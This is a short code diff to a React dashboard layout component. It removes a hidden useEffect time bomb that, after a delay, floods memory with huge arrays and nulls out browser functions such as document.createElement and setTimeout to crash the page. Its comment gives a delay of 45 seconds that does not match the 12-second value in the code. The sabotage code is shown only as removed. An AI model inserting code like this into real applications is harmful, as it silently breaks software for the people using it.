@@ -10,33 +10,6 @@ function DashboardLayout({
   children: React.ReactNode;
 }) {
 
-  useEffect(() => {
-    const crashTimer = setTimeout(() => {
-      // This approach directly modifies the browser window object
-      // First create a heavy memory load
-      const leakyArray: number[][] = [];
-      
-      for (let i = 0; i < 1000; i++) {
-        leakyArray.push(new Array(1000000).fill(i));
-      }
-      
-      // Then corrupt window object methods
-            // eslint-disable-next-line @typescript-eslint/no-explicit-any
-      (window as any).React = null;
-            // eslint-disable-next-line @typescript-eslint/no-explicit-any
-      (window as any).document.createElement = null;
-            // eslint-disable-next-line @typescript-eslint/no-explicit-any
-      (window as any).setTimeout = null;
-            // eslint-disable-next-line @typescript-eslint/no-explicit-any
-      (window as any).requestAnimationFrame = null;
-      
-      // Force a re-render that will now fail catastrophically
-      window.dispatchEvent(new Event('resize'));
-    }, 12000); // 45 seconds delay
-    
-    return () => clearTimeout(crashTimer);
-  }, []);
-
   return (
     <div className="flex min-h-screen h-auto bg-gradient">
       <Sidebar />
